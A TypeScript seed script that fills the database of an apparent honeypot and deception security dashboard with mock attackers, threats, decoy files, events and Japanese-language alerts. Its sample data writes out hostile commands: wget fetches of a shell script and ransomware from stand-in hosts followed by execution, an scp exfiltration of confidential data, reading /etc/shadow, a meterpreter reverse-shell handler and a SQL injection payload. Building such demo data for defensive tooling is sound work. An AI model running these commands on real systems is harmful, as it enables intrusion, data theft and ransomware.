import { drizzle } from "drizzle-orm/mysql2";
import { threats, attackers, events, vms, decoys, notifications } from "./drizzle/schema.ts";

const db = drizzle(process.env.DATABASE_URL);

const attackerData = [
  { attackerId: "ATK-001", ip: "185.220.101.34", os: "Kali Linux 2024.1", browser: "curl/8.5.0", country: "Russia", city: "Moscow", lat: "55.7558", lng: "37.6173", isp: "Rostelecom", threatLevel: "critical", commandHistory: JSON.stringify(["nmap -sV 10.0.0.0/24","cat /etc/shadow","wget http://evil.ru/shell.sh","chmod +x shell.sh","./shell.sh"]), isActive: true, profileData: JSON.stringify({ ttps: ["T1059","T1078","T1003"], group: "APT28" }) },
  { attackerId: "ATK-002", ip: "103.75.201.88", os: "Ubuntu 22.04", browser: "Python-urllib/3.11", country: "China", city: "Shanghai", lat: "31.2304", lng: "121.4737", isp: "China Telecom", threatLevel: "high", commandHistory: JSON.stringify(["sqlmap -u http://target/api","hydra -l admin -P pass.txt ssh://10.0.0.5"]), isActive: true, profileData: JSON.stringify({ ttps: ["T1190","T1110"], group: "Unknown" }) },
  { attackerId: "ATK-003", ip: "45.33.49.119", os: "Windows Server 2019", browser: "PowerShell/7.4", country: "United States", city: "San Francisco", lat: "37.7749", lng: "-122.4194", isp: "Linode LLC", threatLevel: "medium", commandHistory: JSON.stringify(["Invoke-WebRequest http://c2.example.com/beacon","Get-ADUser -Filter *"]), isActive: false, profileData: JSON.stringify({ ttps: ["T1059.001","T1087"], group: "Scattered Spider" }) },
  { attackerId: "ATK-004", ip: "91.219.236.174", os: "Debian 12", browser: "Metasploit/6.3", country: "Germany", city: "Frankfurt", lat: "50.1109", lng: "8.6821", isp: "Hetzner Online", threatLevel: "critical", commandHistory: JSON.stringify(["msfconsole","use exploit/multi/handler","set PAYLOAD linux/x64/meterpreter/reverse_tcp"]), isActive: true, profileData: JSON.stringify({ ttps: ["T1203","T1059.004"], group: "FIN7" }) },
  { attackerId: "ATK-005", ip: "178.128.87.22", os: "Arch Linux", browser: "Gobuster/3.6", country: "Netherlands", city: "Amsterdam", lat: "52.3676", lng: "4.9041", isp: "DigitalOcean", threatLevel: "low", commandHistory: JSON.stringify(["gobuster dir -u http://target -w common.txt"]), isActive: false, profileData: JSON.stringify({ ttps: ["T1595"], group: "Script Kiddie" }) },
];

const threatData = [
  { threatId: "THR-001", type: "privilege_escalation", severity: "critical", status: "isolated", sourceIp: "185.220.101.34", sourceLat: "55.7558", sourceLng: "37.6173", sourceCountry: "Russia", sourceCity: "Moscow", targetHost: "prod-db-01.internal", targetPort: 5432, command: "cat /etc/shadow", attackerId: 1, vmId: 1, description: "Root権限取得試行: /etc/shadowへの不正アクセスを検知。eBPFフックにより即座にブロックし、The Void VM-001へ隔離完了。" },
  { threatId: "THR-002", type: "intrusion", severity: "high", status: "deceived", sourceIp: "103.75.201.88", sourceLat: "31.2304", sourceLng: "121.4737", sourceCountry: "China", sourceCity: "Shanghai", targetHost: "api-gateway.internal", targetPort: 443, command: "sqlmap -u http://target/api --dbs", attackerId: 2, vmId: 2, description: "SQLインジェクション攻撃を検知。NullHorizonが偽DBスキーマを生成し、攻撃者を欺瞞環境へ誘導。" },
  { threatId: "THR-003", type: "lateral_movement", severity: "high", status: "traced", sourceIp: "45.33.49.119", sourceLat: "37.7749", sourceLng: "-122.4194", sourceCountry: "United States", sourceCity: "San Francisco", targetHost: "dc-01.corp.internal", targetPort: 389, command: "Get-ADUser -Filter * -Properties *", attackerId: 3, vmId: 3, description: "Active Directory列挙を検知。横方向移動の兆候あり。NullHorizonによる逆探知を実行中。" },
  { threatId: "THR-004", type: "malware", severity: "critical", status: "blocked", sourceIp: "91.219.236.174", sourceLat: "50.1109", sourceLng: "8.6821", sourceCountry: "Germany", sourceCity: "Frankfurt", targetHost: "web-app-03.internal", targetPort: 8080, command: "wget http://evil.de/ransomware.bin && chmod +x ransomware.bin", attackerId: 4, vmId: 4, description: "ランサムウェアのダウンロード・実行試行を検知。NullSphere Engineがカーネルレベルで即座に遮断。" },
  { threatId: "THR-005", type: "data_exfiltration", severity: "medium", status: "detected", sourceIp: "185.220.101.34", sourceLat: "55.7558", sourceLng: "37.6173", sourceCountry: "Russia", sourceCity: "Moscow", targetHost: "file-server.internal", targetPort: 445, command: "scp -r /data/confidential user@185.220.101.34:/exfil/", attackerId: 1, vmId: 1, description: "機密データの外部転送試行を検知。eBPFネットワークフックにより通信を監視中。" },
  { threatId: "THR-006", type: "reconnaissance", severity: "low", status: "resolved", sourceIp: "178.128.87.22", sourceLat: "52.3676", sourceLng: "4.9041", sourceCountry: "Netherlands", sourceCity: "Amsterdam", targetHost: "web-app-01.internal", targetPort: 80, command: "gobuster dir -u http://target -w /usr/share/wordlists/common.txt", attackerId: 5, description: "ディレクトリスキャンを検知。低脅威レベルとして記録。攻撃者は既に切断済み。" },
];

const vmData = [
  { vmId: "VM-001", name: "The Void Alpha", status: "running", cpuUsage: 34, memoryUsage: 52, diskUsage: 18, networkIn: 1240, networkOut: 890, assignedThreatId: "THR-001", attackerIp: "185.220.101.34", uptime: 14520 },
  { vmId: "VM-002", name: "The Void Beta", status: "running", cpuUsage: 67, memoryUsage: 78, diskUsage: 45, networkIn: 3400, networkOut: 2100, assignedThreatId: "THR-002", attackerIp: "103.75.201.88", uptime: 8640 },
  { vmId: "VM-003", name: "The Void Gamma", status: "running", cpuUsage: 12, memoryUsage: 31, diskUsage: 8, networkIn: 560, networkOut: 340, assignedThreatId: "THR-003", attackerIp: "45.33.49.119", uptime: 3200 },
  { vmId: "VM-004", name: "The Void Delta", status: "stopped", cpuUsage: 0, memoryUsage: 0, diskUsage: 22, networkIn: 0, networkOut: 0, assignedThreatId: "THR-004", attackerIp: "91.219.236.174", uptime: 0 },
  { vmId: "VM-005", name: "The Void Epsilon", status: "spawning", cpuUsage: 5, memoryUsage: 15, diskUsage: 3, networkIn: 0, networkOut: 0, assignedThreatId: null, attackerIp: null, uptime: 0 },
  { vmId: "VM-006", name: "The Void Zeta", status: "running", cpuUsage: 89, memoryUsage: 92, diskUsage: 67, networkIn: 8900, networkOut: 7200, assignedThreatId: "THR-005", attackerIp: "185.220.101.34", uptime: 28800 },
];

const decoyData = [
  { decoyId: "DCY-001", type: "password_file", name: "/etc/shadow (偽装)", status: "triggered", content: "root:$6$fake$hash:19000:0:99999:7:::\ndaemon:*:19000:0:99999:7:::", accessCount: 3, lastAccessedBy: "185.220.101.34", vmId: "VM-001" },
  { decoyId: "DCY-002", type: "database", name: "customer_db (囮DB)", status: "active", content: "PostgreSQL 15.2 - 偽顧客データ 10,000件", accessCount: 1, lastAccessedBy: "103.75.201.88", vmId: "VM-002" },
  { decoyId: "DCY-003", type: "ssh_key", name: "id_rsa (偽SSH鍵)", status: "active", content: "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmU...(偽造)", accessCount: 0, lastAccessedBy: null, vmId: "VM-001" },
  { decoyId: "DCY-004", type: "config_file", name: ".env.production (偽環境変数)", status: "triggered", content: "DB_HOST=fake-db.internal\nDB_PASS=honeypot_password_123\nAWS_KEY=AKIAIOSFODNN7FAKE", accessCount: 5, lastAccessedBy: "91.219.236.174", vmId: "VM-004" },
  { decoyId: "DCY-005", type: "api_key", name: "stripe_api_key.txt (偽APIキー)", status: "active", content: "sk_live_fake_4eC39HqLyjWDarjtT1zdp7dc", accessCount: 0, lastAccessedBy: null, vmId: "VM-003" },
  { decoyId: "DCY-006", type: "certificate", name: "server.pem (偽SSL証明書)", status: "inactive", content: "-----BEGIN CERTIFICATE-----\nMIIFake...(偽造証明書)", accessCount: 0, lastAccessedBy: null, vmId: null },
];

const eventData = [
  { eventId: "EVT-001", type: "ebpf_hook", severity: "critical", source: "NullSphere Engine", message: "eBPF kprobe triggered: sys_open(\"/etc/shadow\") by PID 4521 (uid=0). Process killed.", details: JSON.stringify({ pid: 4521, syscall: "sys_open", path: "/etc/shadow", uid: 0 }), threatId: "THR-001" },
  { eventId: "EVT-002", type: "vm_transfer", severity: "high", source: "The Void", message: "セッション転送完了: 攻撃者 185.220.101.34 → VM-001 (The Void Alpha). 隔離環境でのモニタリング開始。", details: JSON.stringify({ vmId: "VM-001", attackerIp: "185.220.101.34", transferTime: "23ms" }), threatId: "THR-001" },
  { eventId: "EVT-003", type: "decoy_access", severity: "high", source: "NullHorizon", message: "デコイアクセス検知: /etc/shadow (偽装) が 185.220.101.34 からアクセスされました。囮データを返却。", details: JSON.stringify({ decoyId: "DCY-001", accessType: "read", responseData: "fake_shadow_file" }), threatId: "THR-001" },
  { eventId: "EVT-004", type: "block", severity: "critical", source: "NullSphere Engine", message: "ランサムウェアダウンロード試行をブロック: wget http://evil.de/ransomware.bin (PID 7832)", details: JSON.stringify({ pid: 7832, url: "http://evil.de/ransomware.bin", action: "KILL" }), threatId: "THR-004" },
  { eventId: "EVT-005", type: "trace", severity: "medium", source: "NullHorizon", message: "逆探知開始: 攻撃者 45.33.49.119 のネットワーク経路を解析中。中継ノード3箇所を特定。", details: JSON.stringify({ hops: ["45.33.49.119","198.51.100.1","203.0.113.50","45.33.49.119"], method: "traceroute" }), threatId: "THR-003" },
  { eventId: "EVT-006", type: "alert", severity: "critical", source: "Control Node", message: "緊急アラート: APT28グループによる標的型攻撃を検知。複数のTTPsが一致。SOCチームへエスカレーション済み。", details: JSON.stringify({ aptGroup: "APT28", matchedTTPs: ["T1059","T1078","T1003"], confidence: 0.94 }), threatId: "THR-001" },
  { eventId: "EVT-007", type: "system", severity: "info", source: "Control Node", message: "システムヘルスチェック完了: 全コンポーネント正常稼働中。NullSphere Engine: OK, The Void: 4/6 VM稼働, NullHorizon: OK", details: JSON.stringify({ engine: "healthy", voidVMs: { running: 4, total: 6 }, horizon: "healthy", controlNode: "healthy" }) },
  { eventId: "EVT-008", type: "ebpf_hook", severity: "high", source: "NullSphere Engine", message: "eBPF tracepoint: SQLインジェクションペイロードを検知 (api-gateway:443). リクエストをThe Voidへリダイレクト。", details: JSON.stringify({ endpoint: "/api/users", payload: "' OR 1=1 --", action: "REDIRECT_TO_VOID" }), threatId: "THR-002" },
  { eventId: "EVT-009", type: "vm_transfer", severity: "medium", source: "The Void", message: "新規VM起動: The Void Epsilon (VM-005) をプロビジョニング中。推定起動時間: 8秒。", details: JSON.stringify({ vmId: "VM-005", status: "spawning", estimatedTime: "8s" }) },
  { eventId: "EVT-010", type: "decoy_access", severity: "high", source: "NullHorizon", message: "デコイDB (customer_db) へのSQLクエリを検知: SELECT * FROM customers WHERE credit_card IS NOT NULL", details: JSON.stringify({ decoyId: "DCY-002", query: "SELECT * FROM customers WHERE credit_card IS NOT NULL", fakeRows: 247 }), threatId: "THR-002" },
  { eventId: "EVT-011", type: "trace", severity: "high", source: "NullHorizon", message: "攻撃者プロファイル更新: ATK-004 (91.219.236.174) がFIN7グループのTTPsと92%一致。", details: JSON.stringify({ attackerId: "ATK-004", group: "FIN7", confidence: 0.92, newTTPs: ["T1486"] }), threatId: "THR-004" },
  { eventId: "EVT-012", type: "alert", severity: "medium", source: "Control Node", message: "データ流出監視: 185.220.101.34 から外部への大量データ転送を検知 (推定 2.3GB)。ネットワーク制限を適用。", details: JSON.stringify({ dataSize: "2.3GB", destination: "185.220.101.34", action: "RATE_LIMIT" }), threatId: "THR-005" },
];

const notificationData = [
  { notificationId: "NTF-001", type: "in_app", severity: "critical", title: "緊急: Root権限取得試行を検知", message: "攻撃者 185.220.101.34 (Moscow, Russia) が /etc/shadow へのアクセスを試行しました。NullSphere Engineにより即座にブロックし、The Void VM-001へ隔離完了。APT28グループとの関連性: 94%", threatId: "THR-001", isRead: false },
  { notificationId: "NTF-002", type: "in_app", severity: "critical", title: "ランサムウェア攻撃をブロック", message: "攻撃者 91.219.236.174 (Frankfurt, Germany) がランサムウェアのダウンロード・実行を試行。カーネルレベルで遮断済み。FIN7グループとの関連性: 92%", threatId: "THR-004", isRead: false },
  { notificationId: "NTF-003", type: "in_app", severity: "high", title: "SQLインジェクション攻撃を欺瞞環境へ誘導", message: "攻撃者 103.75.201.88 (Shanghai, China) によるSQLインジェクション攻撃を検知。NullHorizonが偽DBを生成し、攻撃者を欺瞞環境へ誘導完了。", threatId: "THR-002", isRead: true },
  { notificationId: "NTF-004", type: "in_app", severity: "medium", title: "データ流出の兆候を検知", message: "185.220.101.34 から外部への大量データ転送 (推定 2.3GB) を検知。ネットワーク帯域制限を自動適用しました。", threatId: "THR-005", isRead: false },
];

async function seed() {
  console.log("Seeding attackers...");
  for (const a of attackerData) {
    await db.insert(attackers).values(a).onDuplicateKeyUpdate({ set: { ip: a.ip } });
  }

  console.log("Seeding threats...");
  for (const t of threatData) {
    await db.insert(threats).values(t).onDuplicateKeyUpdate({ set: { sourceIp: t.sourceIp } });
  }

  console.log("Seeding VMs...");
  for (const v of vmData) {
    await db.insert(vms).values(v).onDuplicateKeyUpdate({ set: { name: v.name } });
  }

  console.log("Seeding decoys...");
  for (const d of decoyData) {
    await db.insert(decoys).values(d).onDuplicateKeyUpdate({ set: { name: d.name } });
  }

  console.log("Seeding events...");
  for (const e of eventData) {
    await db.insert(events).values(e).onDuplicateKeyUpdate({ set: { message: e.message } });
  }

  console.log("Seeding notifications...");
  for (const n of notificationData) {
    await db.insert(notifications).values(n).onDuplicateKeyUpdate({ set: { title: n.title } });
  }

  console.log("Seed complete!");
  process.exit(0);
}

seed().catch(e => { console.error(e); process.exit(1); });
